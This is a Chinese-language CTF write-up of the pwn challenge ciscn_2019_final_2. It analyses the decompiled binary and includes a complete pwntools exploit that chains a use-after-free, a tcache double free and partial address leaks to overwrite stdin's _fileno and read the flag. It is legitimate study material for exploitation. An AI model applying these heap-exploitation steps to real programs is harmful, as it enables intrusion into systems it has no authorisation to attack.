# ciscn_2019_final_2

[题目地址](https://buuoj.cn/challenges#ciscn_2019_final_2)

这题的原理倒是挺好懂的，就是这个堆块结构怎么这么奇怪啊？

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

main函数经典菜单。

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // eax

  init(argc, argv, envp);
  Sandbox_Loading();
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      v3 = get_atoi();
      if ( v3 != 2 )
        break;
      delete();
    }
    if ( v3 > 2 )
    {
      if ( v3 == 3 )
      {
        show();
      }
      else if ( v3 == 4 )
      {
        bye_bye();
      }
    }
    else if ( v3 == 1 )
    {
      allocate();
    }
  }
}
```

一般的题目init里只有setbuf这些，但是这题不一般，里面有关键线索。

```c
unsigned __int64 init()
{
  int fd; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  fd = open("flag", 0);
  if ( fd == -1 )
  {
    puts("no such file :flag");
    exit(-1);
  }
  dup2(fd, 666);
  close(fd);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  alarm(0x3Cu);
  return __readfsqword(0x28u) ^ v2;
}
```

打开了flag，并用[dup2](https://www.cnblogs.com/ptfe/p/10965602.html)函数将flag文件的fd设置为666。这么做一定是有深意的，继续往下看allocate函数。

```c
unsigned __int64 allocate()
{
  _DWORD *v0; // rbx
  int v2; // [rsp+4h] [rbp-1Ch]
  unsigned __int64 v3; // [rsp+8h] [rbp-18h]

  v3 = __readfsqword(0x28u);
  printf("TYPE:\n1: int\n2: short int\n>");
  v2 = get_atoi();
  if ( v2 == 1 )
  {
    int_pt = malloc(0x20uLL);
    if ( !int_pt )
      exit(-1);
    bool = 1;
    printf("your inode number:");
    v0 = int_pt;
    *v0 = get_atoi();
    *((_DWORD *)int_pt + 2) = *(_DWORD *)int_pt; //这里会复制输入的内容
    puts("add success !");
  }
  if ( v2 == 2 )
  {
    short_pt = malloc(0x10uLL);
    if ( !short_pt )
      exit(-1);
    bool = 1;
    printf("your inode number:");
    *(_WORD *)short_pt = get_atoi();
    *((_WORD *)short_pt + 4) = *(_WORD *)short_pt;
    puts("add success !");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

这是一种很新的东西，可以申请两种堆块，一种int，另一种short_int。前者堆块固定0x20大小，后者堆块固定0x10大小。但是堆块大小不等于输入大小，前者固定DWORD，后者固定WORD，等于前者只能输入4字节，后者甚至只有2字节。看delete操作。

```c
unsigned __int64 delete()
{
  int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  if ( bool )
  {
    printf("TYPE:\n1: int\n2: short int\n>");
    v1 = get_atoi();
    if ( v1 == 1 && int_pt )
    {
      free(int_pt);
      bool = 0;
      puts("remove success !");
    }
    if ( v1 == 2 && short_pt )
    {
      free(short_pt);
      bool = 0;
      puts("remove success !");
    }
  }
  else
  {
    puts("invalid !");
  }
  return __readfsqword(0x28u) ^ v2;
}
```

有uaf。这里的设计也很奇怪，有一个标志位bool，bool不为真就不能free。而且free的堆块根据类型固定为int_pt和short_pt。这两个pt根据allocate函数里的设计，永远指向刚刚malloc的堆块，而且没看到能free之前堆块的操作。

```c
unsigned __int64 show()
{
  int v2; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  if ( show_time-- )
  {
    printf("TYPE:\n1: int\n2: short int\n>");
    v2 = get_atoi();
    if ( v2 == 1 && int_pt )
      printf("your int type inode number :%d\n", *(unsigned int *)int_pt);
    if ( v2 == 2 && short_pt )
      printf("your short type inode number :%d\n", (unsigned int)*(__int16 *)short_pt);
  }
  return __readfsqword(0x28u) ^ v3;
}
```

show函数也是，只能看见最新申请堆块的内容。更坑的是，还有次数限制，只能show3次。这是个什么玩意啊，快看[wp](https://blog.csdn.net/m0_51251108/article/details/121107787)。

bye_bye函数看起来没有用，实际上暗藏玄机。

```c
void __noreturn bye_bye()
{
  char v0[104]; // [rsp+0h] [rbp-70h] BYREF
  unsigned __int64 v1; // [rsp+68h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  puts("what do you want to say at last? ");
  __isoc99_scanf("%99s", v0);
  printf("your message :%s we have received...\n", v0);
  puts("have fun !");
  exit(0);
}
```

scanf我们都知道，从stdin读取内容。可是谁规定的？_IO_2_1_stdin_结构体里的_fileno。如果我们把这个_fileno改为flag的666，调用scanf时就会从读取flag，就能打印出flag了。wp的调试图很清楚，这里就直接放exp吧。

```python
from pwn import *
local_file  ='./ciscn_final_2'
local_libc  = './libc-2.27.so'
remote_libc = './libc-2.27.so'
select = 1
if select == 0:
    r = process(local_file)
    libc = ELF(local_libc)
else:
    r = remote('node4.buuoj.cn',28815)
context.log_level = 'debug'
se      = lambda data               :r.send(data)
sa      = lambda delim,data         :r.sendafter(delim, data)
sl      = lambda data               :r.sendline(data)
sla     = lambda delim,data         :r.sendlineafter(delim, data)
sea     = lambda delim,data         :r.sendafter(delim, data)
rc      = lambda numb=4096          :r.recv(numb)
rl      = lambda                    :r.recvline()
ru      = lambda delims                         :r.recvuntil(delims)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info    = lambda tag, addr        :r.info(tag + ': {:#x}'.format(addr))
o_g_32_old = [0x3ac3c, 0x3ac3e, 0x3ac42, 0x3ac49, 0x5faa5, 0x5faa6]
o_g_32 = [0x3ac6c, 0x3ac6e, 0x3ac72, 0x3ac79, 0x5fbd5, 0x5fbd6]
o_g_old = [0x45216,0x4526a,0xf02a4,0xf1147]
o_g = [0x45226, 0x4527a, 0xf0364, 0xf1207]
def debug(cmd=''):
     gdb.attach(r,cmd)
#------------------------------------------------------
def add(ty_pe,number):
    sla('> ','1')
    sla('>',str(ty_pe))
    sla('your inode number:',str(number))
def free(ty_pe):
    sla('> ','2')
    sla('>',str(ty_pe))
def show(ty_pe):
    sla('> ','3')
    sla('>',str(ty_pe))
def leave(content):
    sla('> ','4')
    sla('what do you want to say at last? \n',content)
#-----------------------------------------------------
add(1,0xABCDEFabcdef) #这个堆块给后面做铺垫，unsorted bin attack用。虽然申请的是0xABCDEFabcdef，但由于只能输入4字节，仅有0xEFabcdef保留下来。
free(1) #free清空其fd，bk因为allocate里的复制操作都有0xEFabcdef
for i in range(4):
   add(2,0xABCDEF) #连续申请4个堆块，每一个堆块仅有0xCDEF保留
free(2) #准备double free
add(1,0xabcdefabcdef)#虽然tcache可以直接double free，但是这道题里bool没改成1就不能连续free，于是申请一个块将bool重新改为1
free(2) #double free
show(2) #double free过后，对应的堆块fd里是自己的地址。那么现在show就是泄露出那个堆块地址
ru('your short type inode number :')
heap_low_addr=int(ru('\n')[:-1]) #虽然只有低4字节，但是由于和周围堆块差值不大，足够后面覆盖
if heap_low_addr < 0:
   heap_low_addr += 0x10000
add(2,heap_low_addr-0xa0) #heap_low_addr-0xa0获得第一个申请的堆块的地址，就是最开始add(1,0xABCDEFabcdef)那个。这里把堆块的fd改为第一个堆块的地址，下面就能申请到那个地方
add(2,0) #tcache链因为double free有两个相同的堆块，把堆块拿出来
free(1) #free最开始的堆块
add(2,0x30 + 0x20 * 3 + 1) #这里就申请到了第一个堆块的位置，,0x30 + 0x20 * 3 + 1=0x91。本来这个0x91在prev_size位的，不过因为allocate里会复制内容，成功将0x91写入size域
for i in range(7): #连续free 7次最开始的堆块，每次free都要add将bool设置为1。7次是为了填满tcache bin，让堆块进入unsorted bin
   free(1)
   add(2,0)
free(1) #进入unsorted bin
show(1) #泄露main_arena相关地址
ru('your int type inode number :')
main_arena_low_4byte=int(ru('\n')[:-1])-96
if main_arena_low_4byte < 0:
   main_arena_low_4byte += 0x100000000
malloc_hook_low_4byte = (main_arena_low_4byte & 0xFFFFF000) + (4111408 & 0xFFF) #计算malloc_hook的后4位
libc_base_low_4byte=malloc_hook_low_4byte-4111408
stdin_filno_low_4byte=libc_base_low_4byte+4110848+0x70 #全部只需要计算后4位，这些相关地址大概率仅有后4位不同，无需知道高位
add(2,stdin_filno_low_4byte&0xffff) #这里add到刚才那个size被改为0x90的堆块，并将其fd改为stdin_filno（只用改后4字节）
add(1,0) #类似操作，就是从链表中取出无用堆块。那个size是0x91的堆块经过刚刚的改动size变成0x21了，故申请type 1的堆块
add(1,666) #申请到了stdin_filno的位置，改为flag的fd
leave('a') #此时leave里的scanf是从flag文件里读取内容的，我们输入什么都行
r.interactive()
```

## Flag
> flag{26e01368-122a-4a6f-b1a0-c7608442927e}